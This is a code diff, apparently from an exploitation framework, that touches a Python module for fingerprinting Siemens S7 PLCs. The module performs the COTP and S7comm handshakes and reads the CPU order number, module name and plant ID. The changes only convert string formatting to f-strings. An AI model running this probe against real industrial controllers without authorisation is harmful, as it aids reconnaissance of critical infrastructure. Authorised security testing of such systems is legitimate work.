@@ -75,7 +75,7 @@ _S7_READ_SZL = bytes([
 ])
 
 
-def _recv_tpkt(sock: socket.socket) -> Optional[bytes]:
+def _recv_tpkt(sock: socket.socket) -> bytes | None:
     """Receive a complete TPKT message from socket."""
     try:
         header = b""
@@ -134,11 +134,11 @@ class Exploit(BaseExploit):
     timeout = OptInteger(8, "Socket timeout in seconds")
 
     def run(self) -> None:
-        print_status("Connecting to S7 PLC on {}:{}...".format(self.target, self.port))
+        print_status(f"Connecting to S7 PLC on {self.target}:{self.port}...")
         try:
             sock = socket.create_connection((self.target, self.port), timeout=self.timeout)
         except Exception as exc:
-            print_error("Connection failed: {}".format(exc))
+            print_error(f"Connection failed: {exc}")
             return
 
         try:
@@ -148,7 +148,7 @@ class Exploit(BaseExploit):
             if not cotp_resp or len(cotp_resp) < 5 or cotp_resp[4] != 0x0B:
                 print_error("COTP connection rejected — target may not be an S7 PLC")
                 return
-            print_success("COTP connected to {}:{}".format(self.target, self.port))
+            print_success(f"COTP connected to {self.target}:{self.port}")
 
             # Step 2: S7comm Setup Communication
             sock.sendall(_S7_SETUP_COMM)
@@ -160,7 +160,7 @@ class Exploit(BaseExploit):
             # PDU size from negotiated response
             if len(setup_resp) >= 25:
                 pdu_size = struct.unpack(">H", setup_resp[23:25])[0]
-                print_status("PDU size negotiated: {} bytes".format(pdu_size))
+                print_status(f"PDU size negotiated: {pdu_size} bytes")
 
             # Step 3: Read SZL CPU identification
             sock.sendall(_S7_READ_SZL)
@@ -172,17 +172,17 @@ class Exploit(BaseExploit):
                 try:
                     order_num = szl_data[2:22].decode("ascii", errors="replace").strip("\x00")
                     if order_num:
-                        print_success("Order Number: {}".format(order_num))
+                        print_success(f"Order Number: {order_num}")
                     module_name = szl_data[36:68].decode("ascii", errors="replace").strip("\x00") \
                         if len(szl_data) > 68 else ""
                     if module_name:
-                        print_success("Module Name: {}".format(module_name))
+                        print_success(f"Module Name: {module_name}")
                     plant_id = szl_data[22:32].decode("ascii", errors="replace").strip("\x00") \
                         if len(szl_data) > 32 else ""
                     if plant_id:
-                        print_status("Plant ID: {}".format(plant_id))
+                        print_status(f"Plant ID: {plant_id}")
                 except Exception:
-                    print_status("SZL data ({} bytes) — could not parse fields".format(len(szl_data)))
+                    print_status(f"SZL data ({len(szl_data)} bytes) — could not parse fields")
             else:
                 print_status("No SZL response or insufficient data")
         finally:
